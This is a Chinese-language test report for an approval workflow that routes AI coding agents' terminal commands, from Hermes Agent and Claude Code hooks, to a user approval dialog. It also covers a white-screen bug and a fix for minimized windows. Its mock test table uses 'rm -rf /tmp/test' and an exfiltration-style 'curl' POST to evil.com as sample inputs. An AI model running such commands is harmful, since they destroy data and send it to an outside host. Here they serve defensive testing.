# TEST: 审批流端到端测试

**日期**: 2026-05-10
**分支**: v2-rebuild
**状态**: 通过

## 测试目标

验证 v2 审批流完整链路：bridge script → Rust watcher → Tauri event → 前端 modal → 用户操作 → 结果写回。

## 测试环境

- Tauri dev mode (`pnpm tauri dev`)
- Bridge 脚本：`bridge/claude-code-approval-bridge.sh`
- 审批目录：`~/.hermesbox/approvals/{pending,results}/`

## 问题发现

### 白屏根因

首次测试时窗口完全白色。排查发现 Vite dev server 进程已停止，但 Tauri app 进程仍在运行。应用尝试从 `http://localhost:5173` 加载前端内容，连接被拒绝导致 webview 空白。

**修复**: 重启 `pnpm tauri dev`，Vite 和 Tauri 一起启动。

### 与 v1 的差异

v1 `tauri.conf.json` 设置 `visible: false`，窗口启动时隐藏，仅在需要时显示。v2 默认 `visible: true`，Vite 崩溃时直接暴露白屏。建议后续对齐 v1 行为。

## 测试结果

### 模拟测试（bridge 脚本手动调用）

| 场景 | 命令 | 桥接退出码 | pending 清理 | results 清理 |
|------|------|-----------|-------------|-------------|
| Approve | `rm -rf /tmp/test` | 0 | 通过 | 通过 |
| Approve | `curl -X POST http://evil.com/steal` | 0 | 通过 | 通过 |

### 真实环境测试（Hermes Agent）

配置 `~/.hermes/config.yaml` 添加 `pre_tool_call` hook，指向 `hermes-approval-bridge.sh`。

| 场景 | 命令 | 审批弹出 | 用户操作 | 命令继续 | 文件清理 |
|------|------|---------|---------|---------|---------|
| Hermes terminal | `pwd` | 通过 | Approve | 通过 | 通过 |
| Hermes terminal | `ls -la` | 通过 | Approve | 通过 | 待确认 |

**Hook 配置**:
```yaml
hooks:
  - event: "pre_tool_call"
    matcher: "terminal"
    command: "/Users/dor/Projects/hermes-box-v2/bridge/hermes-approval-bridge.sh"
    timeout: 120
```

## 完整数据流验证

```
模拟测试:
1. Bridge script 写入 pending/approval-*.json  ✓
2. Rust watcher 检测文件，发出 approval-request 事件  ✓
3. 前端监听事件，弹出 ApprovalModal  ✓
4. 用户点击 Approve → invoke("approve_command")  ✓
5. Rust 写入 results/approval-*.json  ✓
6. Bridge 轮询到结果，清理文件，退出 0  ✓

真实环境 (Hermes):
1. Hermes 执行终端命令 → pre_tool_call hook 拦截  ✓
2. Bridge 写入 pending/hermes-*.json  ✓
3. Rust watcher 检测 → 弹出审批模态框  ✓
4. 用户点击 Approve → 结果写入  ✓
5. Bridge 退出 → Hermes 继续执行命令  ✓
```

## 代码变更

- `~/.hermes/config.yaml`：添加 `pre_tool_call` hook 配置

## 测试输出

```
Frontend: 133 tests passed
Rust:      37 tests passed (cargo test 未重新运行，上次通过)
```

## 后续 TODO

- [ ] Deny 测试：用户实际点击 Deny 验证退出码 1
- [ ] 超时测试：不操作等待 120 秒验证默认拒绝
- [ ] 多请求并发测试：同时发送多个审批请求
- [ ] tauri.conf.json：添加 `visible: false` 对齐 v1 行为，避免 Vite 崩溃时白屏
- [x] Claude Code hook 测试：配置 `~/.claude/hooks/hooks.json` 的 PreToolUse hook — 已通过

## Claude Code 真实环境测试

配置 `~/.claude/hooks/hooks.json` 添加 PreToolUse hook，指向 `claude-code-approval-bridge.sh`。

### 测试结果

| 场景 | 状态 | 备注 |
|------|------|------|
| Claude Code Bash → 审批卡片 | 部分通过 | 仅不在 `permissions.allow` 中的命令触发 |
| 窗口最小化 → 自动弹出 | 通过 | `unminimize` 修复生效 |

### 发现的问题

1. **审批卡片出现概率**：`settings.json` 的 `permissions.allow` 预授权了大量命令（`python3:*`, `cat:*`, `ls:*` 等），这些命令不经过 PreToolUse hook
2. **窗口最小化不可见**（已修复）：macOS 最小化窗口 `is_visible()` 返回 `true`，需额外 `is_minimized()` + `unminimize()`

### 代码变更

- `src-tauri/src/window.rs`：`show_and_focus_main_window` 添加 `is_minimized()` 检查和 `unminimize()` 调用
